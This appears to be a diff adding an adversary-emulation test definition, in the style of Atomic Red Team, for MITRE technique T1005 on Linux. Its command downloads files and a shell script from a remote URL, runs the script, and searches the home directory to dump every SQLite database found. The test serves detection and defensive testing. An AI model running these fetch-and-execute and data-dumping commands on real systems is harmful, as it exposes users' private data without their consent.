@@ -1,0 +1,37 @@
+{
+    "name": "Find and dump sqlite databases (Linux)",
+    "description": "An adversary may know/assume that the user of a system uses sqlite databases which contain interest and sensitive data. In this test we download two databases and a sqlite dump script, then run a find command to find & dump the database content. ",
+    "supported_platforms": [
+        "linux"
+    ],
+    "executor": {
+        "name": "bash",
+        "elevation_required": false,
+        "command": "cd $HOME\ncurl -O #{remote_url}/art\ncurl -O #{remote_url}/gta.db\ncurl -O #{remote_url}/sqlite_dump.sh\nchmod +x sqlite_dump.sh\nfind . ! -executable -exec bash -c 'if [[ \"$(head -c 15 {} | strings)\" == \"SQLite format 3\" ]]; then echo \"{}\"; ./sqlite_dump.sh {}; fi' \\;\n",
+        "cleanup_command": "rm -f $HOME/.art\nrm -f $HOME/gta.db\nrm -f $HOME/sqlite_dump.sh \n",
+        "type": "Command Executor"
+    },
+    "id": "T1005",
+    "tactics": [
+        "Collection"
+    ],
+    "technique": "Data from Local System",
+    "source": "ART",
+    "uuid": "00cbb875-7ae4-4cf1-b638-e543fd825300",
+    "arguments": {
+        "remote_url": {
+            "description": "url of remote payload",
+            "type": "url",
+            "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Check if running on a Debian based machine.\n",
+            "prereq_command": "if [ -x \"$(command -v sqlite3)\" ]; then echo \"sqlite3 is installed\"; else echo \"sqlite3 is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v strings)\" ]; then echo \"strings is installed\"; else echo \"strings is NOT installed\"; exit 1; fi\n",
+            "get_prereq_command": "if grep -iq \"debian\\|ubuntu\\|kali\\|mint\" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi\nif grep -iq \"rhel\\|fedora\\|centos\" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
